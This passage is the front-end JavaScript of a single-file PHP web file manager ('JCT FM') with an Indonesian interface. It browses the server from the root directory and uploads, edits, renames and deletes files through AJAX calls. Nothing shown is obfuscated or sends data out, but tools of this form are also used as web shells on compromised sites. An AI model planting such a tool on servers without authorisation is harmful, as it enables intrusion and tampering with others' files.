  sbClose.style.display='none';
}
hamburger.onclick = openSidebar;
sbOverlay.onclick = closeSidebar;
sbClose.onclick   = closeSidebar;

// ── TOAST ────────────────────────────────────────────────────
function toast(msg, type='ok', ms=3500){
  const box=document.getElementById('toasts');
  const el=document.createElement('div');
  el.className=`toast toast-${type}`;el.textContent=msg;
  box.appendChild(el);setTimeout(()=>el.remove(),ms);
}

// ── MODAL MANAGER ────────────────────────────────────────────
const MODAL_IDS=['m-mkdir','m-upload','m-rename','m-edit','m-delete'];
function openModal(id){
  MODAL_IDS.forEach(m=>document.getElementById(m).hidden=true);
  document.getElementById(id).hidden=false;
}
function closeAll(){
  MODAL_IDS.forEach(m=>document.getElementById(m).hidden=true);
}
document.addEventListener('keydown',e=>{if(e.key==='Escape') closeAll()});
MODAL_IDS.forEach(id=>{
  document.getElementById(id).addEventListener('click',e=>{
    if(e.target===e.currentTarget) closeAll();
  });
});

// ── API ──────────────────────────────────────────────────────
async function api(data, file){
  const fd=new FormData();
  fd.append('_ajax','1'); fd.append('_t',T);
  for(const [k,v] of Object.entries(data)) fd.append(k,v);
  if(file) fd.append('file',file);
  const r=await fetch(URL,{method:'POST',body:fd});
  return r.json();
}

// ── ROUTING ──────────────────────────────────────────────────
function getPath(){
  const h=location.hash.slice(1);
  const m=h.match(/^path=(.+)$/);
  return m?m[1]:DEFAULT_PATH;
}
function goTo(path){
  const newHash='#path='+path;
  if(location.hash!==newHash) history.pushState(null,'',newHash);
  renderDir(path);
  closeSidebar();
}
window.addEventListener('popstate',()=>renderDir(getPath()));

// ── BREADCRUMB ───────────────────────────────────────────────
function renderBreadcrumb(path){
  const bc=document.getElementById('breadcrumb');
  bc.innerHTML='';
  const crumb=(label,p)=>{
    const s=document.createElement('span');
    s.className='crumb';s.textContent=label;
    s.onclick=()=>goTo(p);bc.appendChild(s);
  };
  const sep=()=>{
    const s=document.createElement('span');
    s.className='sep';s.textContent='/';bc.appendChild(s);
  };
  crumb('~','/');
  const parts=path.split('/').filter(Boolean);
  let built='';
  for(const p of parts){built+='/'+p;sep();crumb(p,built);}
}

// ── SVG ICONS ────────────────────────────────────────────────
const IC={
  dir :`<svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M10 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V8a2 2 0 00-2-2h-8l-2-2z"/></svg>`,
  file:`<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>`,
  back:`<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>`,
  edit:`<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>`,
  ren :`<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 013 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>`,
  del :`<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>`,
};
const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');

// ── PATH HELPER ──────────────────────────────────────────────
function joinPath(dir,name){
  return (dir.endsWith('/')?dir:dir+'/')+name;
}
function parentPath(path){
  return path.replace(/\/[^/]+\/?$/,'')||'/';
}

// ── RENDER DIR ───────────────────────────────────────────────
async function renderDir(path){
  document.title=`JCT FM — ${path}`;
  renderBreadcrumb(path);
  const tbody=document.getElementById('fbody');
  tbody.innerHTML='<tr class="empty-row"><td colspan="4">Memuat data...</td></tr>';

  let data;
  try{ data=await api({act:'ls',dir:path}); }
  catch(e){ tbody.innerHTML=`<tr class="empty-row"><td colspan="4" style="color:var(--err)">Gagal terhubung ke server.</td></tr>`; return; }
  if(data.error){ tbody.innerHTML=`<tr class="empty-row"><td colspan="4" style="color:var(--err)">${esc(data.error)}</td></tr>`; return; }

  buildTree(data.tree||[],path);
  const {dirs=[],files=[]}=data;
  tbody.innerHTML='';

  // Baris ".."
  if(path!=='/'){
    const parent=parentPath(path);
    const tr=document.createElement('tr');
    tr.innerHTML=`
      <td><div class="td-name clickable" data-nav="${esc(parent)}">
        <span class="name-icon">${IC.back}</span>
        <span class="name-label">..</span>
      </div></td>
      <td class="col-size td-meta"></td><td class="col-date td-meta"></td><td class="col-act"></td>`;
    tbody.appendChild(tr);
  }

  // Folder
  for(const d of dirs){
    const fp=joinPath(path,d.n);
    const tr=document.createElement('tr');
    tr.innerHTML=`
      <td><div class="td-name clickable" data-nav="${esc(fp)}">
        <span class="name-icon dir">${IC.dir}</span>
        <span class="name-label">${esc(d.n)}</span>
      </div></td>
      <td class="col-size td-meta">—</td>
      <td class="col-date td-meta">${esc(d.m)}</td>
      <td class="col-act">
        <div class="row-actions">
          <button class="btn-icon btn-ghost" data-ren="${esc(fp)}" data-ren-name="${esc(d.n)}" title="Rename">${IC.ren}</button>
          <button class="btn-icon btn-ghost btn-danger" data-del="${esc(fp)}" data-del-label="${esc(d.n)}" title="Hapus">${IC.del}</button>
        </div>
      </td>`;
    tbody.appendChild(tr);
  }

  // File
  for(const f of files){
    const fp=joinPath(path,f.n);
    const editBtn=f.ed
      ?`<button class="btn-icon btn-ghost" data-edit="${esc(fp)}" data-edit-name="${esc(f.n)}" title="Edit">${IC.edit}</button>`
      :'';
    const tr=document.createElement('tr');
    tr.innerHTML=`
      <td><div class="td-name">
        <span class="name-icon">${IC.file}</span>
        <span class="name-label">${esc(f.n)}</span>
      </div></td>
      <td class="col-size td-meta">${esc(f.s)}</td>
      <td class="col-date td-meta">${esc(f.m)}</td>
      <td class="col-act">
        <div class="row-actions">
          ${editBtn}
          <button class="btn-icon btn-ghost" data-ren="${esc(fp)}" data-ren-name="${esc(f.n)}" title="Rename">${IC.ren}</button>
          <button class="btn-icon btn-ghost btn-danger" data-del="${esc(fp)}" data-del-label="${esc(f.n)}" title="Hapus">${IC.del}</button>
        </div>
      </td>`;
    tbody.appendChild(tr);
  }

  if(!dirs.length && !files.length)
    tbody.innerHTML='<tr class="empty-row"><td colspan="4">Direktori kosong.</td></tr>';

  // Pasang event listener
  tbody.querySelectorAll('[data-nav]').forEach(el=>el.addEventListener('click',()=>goTo(el.dataset.nav)));
  tbody.querySelectorAll('[data-del]').forEach(el=>el.addEventListener('click',()=>confirmDelete(el.dataset.del,el.dataset.delLabel)));
  tbody.querySelectorAll('[data-ren]').forEach(el=>el.addEventListener('click',()=>startRename(el.dataset.ren,el.dataset.renName)));
  tbody.querySelectorAll('[data-edit]').forEach(el=>el.addEventListener('click',()=>openEdit(el.dataset.edit,el.dataset.editName)));
}

// ── SIDEBAR TREE ─────────────────────────────────────────────
function buildTree(nodes,activePath){
  const c=document.getElementById('tree');c.innerHTML='';
  const homeRow=document.createElement('div');
  homeRow.className='tree-item'+(activePath==='/'?' active':'');
  homeRow.innerHTML=`<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" style="flex-shrink:0;opacity:.8"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg><span>/ root</span>`;
  homeRow.onclick=()=>goTo('/');c.appendChild(homeRow);
  for(const node of nodes){
    const el=document.createElement('div');
    el.className='tree-item'+(activePath===node.p||activePath.startsWith(node.p+'/')?' active':'');
    el.style.paddingLeft='22px';
    el.innerHTML=`<span class="name-icon dir" style="flex-shrink:0">${IC.dir}</span><span>${esc(node.n)}</span>`;
    el.onclick=()=>goTo(node.p);c.appendChild(el);
  }
}

// ── MKDIR ─────────────────────────────────────────────────────
document.getElementById('btn-mkdir').onclick=()=>{
  document.getElementById('mkdir-name').value='';
  openModal('m-mkdir');
  setTimeout(()=>document.getElementById('mkdir-name').focus(),50);
};
document.getElementById('mkdir-ok').onclick=async()=>{
  const name=document.getElementById('mkdir-name').value.trim();
  if(!name) return;
  closeAll();
  const d=await api({act:'mkdir',dir:getPath(),name});
  toast(d.msg,d.ok?'ok':'err');
  if(d.ok) renderDir(getPath());
};
document.getElementById('mkdir-name').addEventListener('keydown',e=>{if(e.key==='Enter') document.getElementById('mkdir-ok').click()});

// ── UPLOAD ────────────────────────────────────────────────────
let pendingFiles=[];
const dropZone=document.getElementById('drop-zone');
const filePick=document.getElementById('file-pick');
document.getElementById('btn-upload').onclick=()=>{
  pendingFiles=[];document.getElementById('file-names').textContent='';
  openModal('m-upload');
};
dropZone.addEventListener('click',()=>filePick.click());
dropZone.addEventListener('dragover',e=>{e.preventDefault();dropZone.classList.add('over')});
dropZone.addEventListener('dragleave',()=>dropZone.classList.remove('over'));
dropZone.addEventListener('drop',e=>{e.preventDefault();dropZone.classList.remove('over');setFiles(e.dataTransfer.files)});
filePick.addEventListener('change',()=>setFiles(filePick.files));
function setFiles(fl){
  pendingFiles=[...fl];
  document.getElementById('file-names').textContent=pendingFiles.length?pendingFiles.map(f=>f.name).join(', '):'';
}
document.getElementById('upload-ok').onclick=async()=>{
  if(!pendingFiles.length){toast('Tidak ada file dipilih','err');return;}
  closeAll();
  let ok=0,fail=0;
  for(const file of pendingFiles){
    const d=await api({act:'upload',dir:getPath()},file);
    d.ok?ok++:(fail++,toast(d.msg,'err'));
  }
  if(ok) toast(`${ok} file berhasil diunggah`);
  renderDir(getPath());pendingFiles=[];
};

// ── RENAME ────────────────────────────────────────────────────
let renTarget='';
function startRename(path,currentName){
  renTarget=path;
  document.getElementById('rename-input').value=currentName;
  openModal('m-rename');
  setTimeout(()=>{
    const inp=document.getElementById('rename-input');
    inp.focus();
    const dot=currentName.lastIndexOf('.');
    inp.setSelectionRange(0,dot>0?dot:currentName.length);
  },50);
}
document.getElementById('rename-ok').onclick=async()=>{
  const newname=document.getElementById('rename-input').value.trim();
  if(!newname) return;
  closeAll();
  const d=await api({act:'rename',path:renTarget,newname});
  toast(d.msg,d.ok?'ok':'err');
  if(d.ok) renderDir(getPath());
};
document.getElementById('rename-input').addEventListener('keydown',e=>{if(e.key==='Enter') document.getElementById('rename-ok').click()});

// ── EDIT FILE ─────────────────────────────────────────────────
let editPath='';
async function openEdit(path,name){
  editPath=path;
  document.getElementById('edit-title').textContent=`[/] ${name}`;
  document.getElementById('edit-status').textContent='Memuat data...';
  document.getElementById('edit-textarea').value='';
  openModal('m-edit');
  const d=await api({act:'read',path});
  if(!d.ok){toast(d.msg,'err');closeAll();return;}
  document.getElementById('edit-textarea').value=d.content;
  document.getElementById('edit-status').textContent=`${d.content.length.toLocaleString()} karakter`;
}
document.getElementById('edit-save').onclick=async()=>{
  const content=document.getElementById('edit-textarea').value;
  document.getElementById('edit-status').textContent='Menyimpan...';
  const d=await api({act:'save',path:editPath,content});
  document.getElementById('edit-status').textContent=d.ok
    ?`Tersimpan — ${content.length.toLocaleString()} karakter`
    :d.msg;
  toast(d.msg,d.ok?'ok':'err');
};
document.getElementById('edit-cancel').onclick=closeAll;

document.getElementById('edit-textarea').addEventListener('keydown',e=>{
  if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();document.getElementById('edit-save').click();}
});

// ── DELETE ────────────────────────────────────────────────────
let delTarget='';
function confirmDelete(path,label){
  delTarget=path;
  document.getElementById('del-label').textContent=`Target: "${label}"`;
  openModal('m-delete');
}
document.getElementById('del-ok').onclick=async()=>{
  closeAll();
  const d=await api({act:'delete',path:delTarget});
  toast(d.msg,d.ok?'ok':'err');
  if(d.ok) renderDir(getPath());
};

// ── INIT ─────────────────────────────────────────────────────
renderDir(getPath());
</script>
<?php endif ?>
</body>
</html>
